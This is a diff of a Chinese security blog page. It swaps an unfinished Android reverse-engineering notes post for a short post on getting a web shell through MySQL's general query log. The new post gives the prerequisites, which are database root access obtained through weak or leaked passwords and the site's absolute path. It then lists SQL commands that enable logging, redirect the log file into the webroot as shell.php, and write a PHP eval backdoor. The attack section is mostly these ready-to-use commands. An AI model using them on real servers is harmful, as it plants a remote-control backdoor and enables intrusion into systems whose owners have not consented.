@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>逆向基础 | machao629</title>
+  <title>mysql 同步日志Getshell | machao629</title>
   <meta name="keywords" content="">
-  <meta name="description" content="逆向基础 | machao629">
+  <meta name="description" content="mysql 同步日志Getshell | machao629">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="一个默默无闻的安全小卒。一个啥都不会的脚本小子。一个立志成为大佬的大佬。一个将来牛逼哄哄的博客。">
 <meta property="og:type" content="website">
@@ -77,7 +77,7 @@
     
         
             
-            <li><div data-rel="安卓逆向">安卓逆向<small>(1)</small></div>
+            <li><div data-rel="杂七杂八">杂七杂八<small>(1)</small></div>
                 
             </li>
             
@@ -85,7 +85,7 @@
     
         
             
-            <li><div data-rel="杂七杂八">杂七杂八<small>(1)</small></div>
+            <li><div data-rel="GetShell">GetShell<small>(1)</small></div>
                 
             </li>
             
@@ -154,20 +154,20 @@
     
     <nav id="title-list-nav">
         
+        <a  class="全部文章 GetShell "
+           href="/2021/01/04/mysql%E6%97%A5%E5%BF%97getshell/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="mysql 同步日志Getshell">mysql 同步日志Getshell</span>
+            <span class="post-date" title="2021-01-04 11:42:25">2021/01/04</span>
+        </a>
+        
         <a  class="全部文章 杂七杂八 "
            href="/2020/12/15/%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84cmder/"
            data-tag=""
            data-author="" >
             <span class="post-title" title="渗透测试的Cmder">渗透测试的Cmder</span>
             <span class="post-date" title="2020-12-15 10:18:37">2020/12/15</span>
-        </a>
-        
-        <a  class="全部文章 安卓逆向 "
-           href="/2020/11/19/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="逆向基础">逆向基础</span>
-            <span class="post-date" title="2020-11-19 21:25:51">2020/11/19</span>
         </a>
         
         <a  class="全部文章 "
@@ -195,9 +195,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-逆向基础" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-mysql日志getshell" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">逆向基础</h1>
+        <h1 class="article-title">mysql 同步日志Getshell</h1>
     
     <div class="article-meta">
         
@@ -207,7 +207,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="安卓逆向">安卓逆向</a>
+            <a  data-rel="GetShell">GetShell</a>
             
         </span>
         
@@ -215,7 +215,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-12-15 10:18:15'>2020-11-19 21:25</time>
+            发布时间 : <time class="date" title='最后更新: 2021-01-04 22:08:38'>2021-01-04 11:42</time>
         
     </div>
     <div class="article-meta">
@@ -237,7 +237,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">一、环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-text">二、APK文件结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81APK%E6%89%93%E5%8C%85%E6%B5%81%E7%A8%8B"><span class="toc-text">三、APK打包流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81APK%E5%AE%89%E5%8D%93%E6%B5%81%E7%A8%8B"><span class="toc-text">四、APK安卓流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-text">五、虚拟机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81AndroidKiller"><span class="toc-text">六、AndroidKiller</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E7%AF%A1%E6%94%B9apk-%E5%9B%BE%E6%A0%87%E5%90%8D%E7%A7%B0"><span class="toc-text">七、篡改apk 图标名称</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E6%8F%90"><span class="toc-text">一、前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-text">二、攻击命令：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA"><span class="toc-text">三、 实战演示</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -253,20 +253,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>需要安装jdk、sdk、ndk还有Android studio。<br>需要进行翻墙处理。具体的细节不在这里描述。</p>
-<h2 id="二、APK文件结构"><a href="#二、APK文件结构" class="headerlink" title="二、APK文件结构"></a>二、APK文件结构</h2><p>Android应用程序是以apk格式的文件进行发布的，源代码文件、资源文件、AndroidManifetst.xml文件等会被压缩到apk文件中。apk文件和jar包一样，是一个zip文件。</p>
-<p>将apk后缀改为zip后，文件目录一般如下：</p>
-<h2 id="三、APK打包流程"><a href="#三、APK打包流程" class="headerlink" title="三、APK打包流程"></a>三、APK打包流程</h2><h2 id="四、APK安卓流程"><a href="#四、APK安卓流程" class="headerlink" title="四、APK安卓流程"></a>四、APK安卓流程</h2><p>1、复制到/data/app/ 目录下以自己<br>2、<br>3、<br>4、<br>5、对dex(源码)进行一个优化工作，保存至虚拟机缓存目录。<br>6、解析Androidmainfast.xml(配置清单)出四大组件信息。就开始发送广播，</p>
-<h2 id="五、虚拟机"><a href="#五、虚拟机" class="headerlink" title="五、虚拟机"></a>五、虚拟机</h2><p>1、jvm；java编译后生成java字节码，需要jvm将java字节码翻译成汇编指令。运行在操作系统上。</p>
-<p>2、dvm：安卓虚拟机，每个进程一个虚拟机。通过解释dex字节码。</p>
-<p>dalivk虚拟机</p>
-<p>MT文件管理器</p>
-<p>通过版本在文件里面区分是那个虚拟机art/dalvik</p>
-<p>/system/bin/dexopt<br>/system/bin/dex2oat</p>
-<h2 id="六、AndroidKiller"><a href="#六、AndroidKiller" class="headerlink" title="六、AndroidKiller"></a>六、AndroidKiller</h2><p>1、登录以后配置jdk路径(jdk bin目录)<br>2、配饰apktool必须是2.4版本。</p>
-<h2 id="七、篡改apk-图标名称"><a href="#七、篡改apk-图标名称" class="headerlink" title="七、篡改apk 图标名称"></a>七、篡改apk 图标名称</h2><p><Application >入口点<br><provider >发布者签名</p>
-<p>雷电模拟器</p>
-<p>改名直接在xml改<br>一定是png格式的<br>在res目录下。<br>明天补一下笔记。</p>
+        <h2 id="一、前提"><a href="#一、前提" class="headerlink" title="一、前提"></a>一、前提</h2><p><b>版本：Mysql 5.0 + <b></p>
+<p><b>前提：获取数据库root权限(弱口令、密码泄露等方式)、知道网站的绝对路径(不知道的情况下可以使用“select @@datadir;”根据数据库的路径来猜测web路径)</b></p>
+<h2 id="二、攻击命令："><a href="#二、攻击命令：" class="headerlink" title="二、攻击命令："></a>二、攻击命令：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;; \\查看日志是否开启</span><br><span class="line"></span><br><span class="line">SET GLOBAL general_log&#x3D;&#39;on&#39;; \\开启日志记录</span><br><span class="line"></span><br><span class="line">set global general_log_file&#x3D;&#39;D:\\phpStudy\\WWW\\shell.php&#39;; \\修改日志路径 (注意这里是双线)</span><br><span class="line"></span><br><span class="line">select &quot;&lt;?php eval($_POST[&#39;gg&#39;]);?&gt;&quot;; \\写入shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、-实战演示"><a href="#三、-实战演示" class="headerlink" title="三、 实战演示"></a>三、 实战演示</h2><p>这里利用phpmyadmin本地搭建环境进行演示</p>
+<p><img src="1.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
